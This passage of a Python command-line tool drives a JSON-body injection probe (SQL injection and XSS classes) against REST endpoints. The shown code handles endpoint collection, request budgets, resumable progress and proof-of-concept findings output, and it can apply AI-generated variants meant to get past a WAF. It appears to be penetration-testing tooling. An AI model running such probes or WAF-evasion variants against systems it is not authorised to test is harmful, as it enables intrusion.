        or not isinstance(deferred, list)
        or any(
            isinstance(item, bool)
            or not isinstance(item, int)
            or not 0 <= item < endpoint_count
            for item in deferred
        )
        or len(set(deferred)) != len(deferred)
    ):
        return fresh
    return {
        "start_index": start_index,
        "deferred_indices": list(deferred),
        "resumed": True,
    }


def _build_probe_cursor(
    input_fingerprint: str,
    *,
    endpoint_count: int,
    next_endpoint_index: int,
    deferred_endpoint_indices: list[int],
) -> dict:
    deferred = list(dict.fromkeys(int(item) for item in deferred_endpoint_indices))
    next_index = max(0, min(int(next_endpoint_index), endpoint_count))
    remaining = len(deferred) + max(0, endpoint_count - next_index)
    return {
        "schema_version": CURSOR_SCHEMA_VERSION,
        "input_fingerprint": input_fingerprint,
        "endpoint_count": endpoint_count,
        "next_endpoint_index": next_index,
        "deferred_endpoint_indices": deferred,
        "remaining_endpoint_count": remaining,
        "coverage_complete": remaining == 0,
    }


def _write_json_atomic(path: Path, payload: dict) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    temp_path: Path | None = None
    try:
        with tempfile.NamedTemporaryFile(
            "w",
            encoding="utf-8",
            dir=str(path.parent),
            prefix=f".{path.name}.",
            suffix=".tmp",
            delete=False,
        ) as handle:
            temp_path = Path(handle.name)
            handle.write(json.dumps(payload, ensure_ascii=False, indent=2) + "\n")
            handle.flush()
            os.fsync(handle.fileno())
        temp_path.replace(path)
    except Exception:
        if temp_path is not None:
            try:
                temp_path.unlink()
            except FileNotFoundError:
                pass
        raise


def _write_findings(
    target: str,
    hits: list[dict],
    waf_events: list[dict],
    *,
    execution: dict | None = None,
) -> dict:
    target_key = target_storage_key(target)
    out_dir = BASE_DIR / "findings" / target_key / "poc" / "json_inject"
    out_dir.mkdir(parents=True, exist_ok=True)
    summary_path = out_dir / "summary.json"
    written: list[str] = []
    details = dict(execution or {})
    resumed = bool(details.get("resumed"))
    previous: dict = {}
    if resumed and summary_path.is_file():
        try:
            loaded = json.loads(summary_path.read_text(encoding="utf-8"))
            if isinstance(loaded, dict) and loaded.get("input_fingerprint") == details.get("input_fingerprint"):
                previous = loaded
        except (OSError, json.JSONDecodeError):
            previous = {}
    if not previous:
        for stale in out_dir.glob("*.json"):
            if stale.name != "summary.json":
                stale.unlink()
    for hit in hits:
        slug_url = re.sub(r"[^A-Za-z0-9._-]+", "_", urllib.parse.urlparse(hit["url"]).path).strip("_") or "root"
        fname = f"{hit['payload_class']}_{slug_url}_{hit['field']}.json"
        path = out_dir / fname
        path.write_text(json.dumps(hit, indent=2, sort_keys=True) + "\n", encoding="utf-8")
        written.append(str(path))
    status = str(details.pop("status", "") or "")
    transport_errors = int(details.get("transport_error_count", 0) or 0)
    redirect_skips = int((details.get("skipped") or {}).get("out_of_scope_redirect", 0) or 0)
    prior_hits = previous.get("hits") if isinstance(previous.get("hits"), list) else []
    prior_waf = previous.get("waf_observations") if isinstance(previous.get("waf_observations"), list) else []
    prior_hit_count = int(previous.get("hit_count", 0) or 0) if previous else 0
    prior_waf_count = int(previous.get("waf_observation_count", 0) or 0) if previous else 0
    if not status:
        status = "candidate_pending" if (hits or prior_hit_count) else (
            "partial" if transport_errors or redirect_skips or details.get("budget_exhausted") else "complete_no_hit"
        )
    current_hit_summaries = [
        {
            "url": h["url"],
            "field": h["field"],
            "class": h["payload_class"],
            "signal": h["signal"],
        }
        for h in hits
    ]
    merged_hits = _merge_summary_items(prior_hits, current_hit_summaries)
    merged_waf = _merge_summary_items(prior_waf, waf_events)
    summary = {
        "schema_version": SUMMARY_SCHEMA_VERSION,
        "kind": "json_inject_summary",
        "target": canonical_target_value(target),
        "status": status,
        **details,
        "hit_count": prior_hit_count + _new_summary_item_count(prior_hits, current_hit_summaries),
        "waf_observation_count": prior_waf_count + _new_summary_item_count(prior_waf, waf_events),
        "generated_at": int(time.time()),
        "hits": merged_hits[:SUMMARY_ITEM_LIMIT],
        "waf_observations": merged_waf[:SUMMARY_ITEM_LIMIT],
    }
    _write_json_atomic(summary_path, summary)
    return {"out_dir": str(out_dir), "summary": str(summary_path), "files": written}


def _merge_summary_items(previous: list, current: list) -> list:
    merged = [item for item in previous if isinstance(item, dict)]
    seen = {
        json.dumps(item, sort_keys=True, ensure_ascii=False, separators=(",", ":"))
        for item in merged
    }
    for item in current:
        if not isinstance(item, dict):
            continue
        key = json.dumps(item, sort_keys=True, ensure_ascii=False, separators=(",", ":"))
        if previous and key in seen:
            continue
        merged.append(item)
        seen.add(key)
    return merged


def _new_summary_item_count(previous: list, current: list) -> int:
    previous_keys = {
        json.dumps(item, sort_keys=True, ensure_ascii=False, separators=(",", ":"))
        for item in previous
        if isinstance(item, dict)
    }
    return sum(
        1
        for item in current
        if isinstance(item, dict)
        and json.dumps(item, sort_keys=True, ensure_ascii=False, separators=(",", ":")) not in previous_keys
    )


# ---------------------------------------------------------------------------
# CLI


def main() -> int:
    parser = argparse.ArgumentParser(description="POST-JSON injection probe — covers REST-API JSON-body attack surface")
    parser.add_argument("--target", required=True, help="Target host or host:port (used for storage path + default seeds)")
    parser.add_argument("--endpoints-file", default="", help="File with one URL per line OR JSONL of {method,url,body}")
    parser.add_argument("--js-intel", default="", help="Path to findings/<t>/js_intel/hypotheses.json for endpoint seeds")
    parser.add_argument(
        "--waf-plan",
        default="",
        help="Optional target-owned AI WAF-pass plan JSON; only used after a new baseline-relative SQLi/XSS block",
    )
    seed_group = parser.add_mutually_exclusive_group()
    seed_group.add_argument("--add-default-seeds", dest="add_default_seeds", action="store_true",
                            default=True, help="When no other source provides endpoints, probe common login paths")
    seed_group.add_argument("--no-default-seeds", dest="add_default_seeds", action="store_false",
                            help="Probe only endpoints supplied by explicit or discovered inputs")
    parser.add_argument("--max-requests", type=int, default=60, help="Hard cap on total requests for the whole probe lane")
    add_cli_args(parser)
    args = parser.parse_args()
    if args.max_requests < 1:
        parser.error("--max-requests must be a positive integer")
    args.target = canonical_target_value(args.target)
    session = session_from_args(args).bind_target(args.target)
    try:
        waf_plan = load_plan(args.waf_plan, target=args.target) if args.waf_plan else None
    except ValueError as exc:
        parser.error(str(exc))

    endpoints, skipped = _collect_endpoints(args)
    source_bindings = [
        binding
        for binding in (
            _source_binding(args.endpoints_file),
            _source_binding(args.js_intel),
            _source_binding(args.waf_plan),
        )
        if binding
    ]
    input_fingerprint = _input_fingerprint(endpoints, source_bindings)
    if not endpoints:
        print(
            "[json_inject] no eligible POST endpoints to probe "
            f"(out_of_scope={skipped['out_of_scope']} "
            f"unsupported_method={skipped['unsupported_method']} invalid_url={skipped['invalid_url']})",
            file=sys.stderr,
        )
        if source_bindings or any(int(skipped[key]) for key in ("out_of_scope", "unsupported_method", "invalid_url")):
            _write_findings(
                args.target,
                [],
                [],
                execution={
                    "status": "invalid_input",
                    "input_fingerprint": input_fingerprint,
                    "source_bindings": source_bindings,
                    "endpoint_count": 0,
                    "probed_endpoint_count": 0,
                    "request_count": 0,
                    "transport_error_count": 0,
                    "skipped": {**skipped, "out_of_scope_redirect": 0},
                    "auth_applied": False,
                    "auth_session_id": session.session_id(),
                    "waf_plan_ref": str(waf_plan.get("plan_ref") or "") if waf_plan else "",
                    "waf_plan_sha256": str(waf_plan.get("plan_sha256") or "") if waf_plan else "",
                    "waf_plan_variant_count": len(waf_plan.get("variants") or []) if waf_plan else 0,
                    "waf_ai_variants_executed": 0,
                },
            )
        return 1

    print(f"[json_inject] probing {len(endpoints)} endpoint(s) for target={args.target}", file=sys.stderr)
    all_hits: list[dict] = []
    all_waf_events: list[dict] = []
    execution_stats = {
        "request_count": 0,
        "transport_error_count": 0,
        "out_of_scope_redirect": 0,
    }
    probed_endpoint_count = 0
    request_budget = int(args.max_requests)
    if waf_plan and waf_plan.get("max_requests") is not None:
        request_budget = min(request_budget, int(waf_plan["max_requests"]))
    summary_path = BASE_DIR / "findings" / target_storage_key(args.target) / "poc" / "json_inject" / "summary.json"
    cursor_state = _probe_cursor(
        summary_path,
        target=args.target,
        input_fingerprint=input_fingerprint,
        endpoint_count=len(endpoints),
        kind="json_inject_summary",
    )
    start_index = int(cursor_state["start_index"])
    deferred_indices = list(cursor_state["deferred_indices"])
    worklist: list[int] = []
    for index in [*deferred_indices, *range(start_index, len(endpoints))]:
        if index not in worklist:
            worklist.append(index)
    next_index = start_index
    deferred_next: list[int] = []
    processed_work_items = 0
    for position, index in enumerate(worklist):
        ep = endpoints[index]
        remaining_budget = request_budget - execution_stats["request_count"]
        if remaining_budget <= 0:
            break
        remaining_endpoints = len(worklist) - position
        endpoint_budget = max(1, remaining_budget // remaining_endpoints)
        print(f"[json_inject]  -> {ep['method']} {ep['url']} (source={ep.get('source')})", file=sys.stderr)
        before_errors = execution_stats["transport_error_count"]
        before_redirects = execution_stats["out_of_scope_redirect"]
        hits, waf_events = probe_endpoint(
            ep,
            max_requests=endpoint_budget,
            target=args.target,
            session=session,
            waf_plan=waf_plan,
            stats=execution_stats,
        )
        probed_endpoint_count += 1
        processed_work_items += 1
        all_waf_events.extend(waf_events)
        if hits:
            print(f"[json_inject]     {len(hits)} hit(s)", file=sys.stderr)
            all_hits.extend(hits)
        if index >= start_index:
            next_index = max(next_index, index + 1)
        if execution_stats["transport_error_count"] > before_errors or execution_stats["out_of_scope_redirect"] > before_redirects:
            deferred_next.append(index)
    deferred_next.extend(
        index
        for index in worklist[processed_work_items:]
        if index < start_index
    )
    cursor = _build_probe_cursor(
        input_fingerprint,
        endpoint_count=len(endpoints),
        next_endpoint_index=next_index,
        deferred_endpoint_indices=deferred_next,
    )

    skipped["out_of_scope_redirect"] = execution_stats["out_of_scope_redirect"]
    budget_exhausted = bool(
        execution_stats["request_count"] >= request_budget
        or not cursor["coverage_complete"]
    )
    result = _write_findings(
        args.target,
        all_hits,
        all_waf_events,
        execution={
            "input_fingerprint": input_fingerprint,
            "source_bindings": source_bindings,
            "endpoint_count": len(endpoints),
            "probed_endpoint_count": probed_endpoint_count,
            "batch_start_endpoint_index": start_index,
            "batch_tested_endpoint_count": processed_work_items,
            "resumed": bool(cursor_state["resumed"]),
            "cursor": cursor,
            "request_count": execution_stats["request_count"],
            "request_budget": request_budget,
            "budget_exhausted": budget_exhausted,
            "transport_error_count": execution_stats["transport_error_count"],
            "skipped": skipped,
            "auth_applied": bool(
                not session.is_empty()
                and any(session.headers_for_url(str(item.get("url") or "")) for item in endpoints)
            ),
            "auth_session_id": session.session_id(),
            "waf_plan_ref": str(waf_plan.get("plan_ref") or "") if waf_plan else "",
            "waf_plan_sha256": str(waf_plan.get("plan_sha256") or "") if waf_plan else "",
            "waf_plan_variant_count": len(waf_plan.get("variants") or []) if waf_plan else 0,
            "waf_ai_variants_executed": sum(
                1 for event in all_waf_events if event.get("variant_source") == "ai"
            ),
        },
    )
    if not all_hits:
        if all_waf_events:
            print(
                f"[json_inject] no injection hits; preserved {len(all_waf_events)} WAF observations",
                file=sys.stderr,
            )
        else:
            print("[json_inject] no injection hits — check endpoint shapes / try --js-intel for richer surface", file=sys.stderr)
        print(json.dumps({"status": "no_hits", "hit_count": 0, **result}, indent=2))
        return 0

    print(json.dumps({"status": "ok", "hit_count": len(all_hits), **result}, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
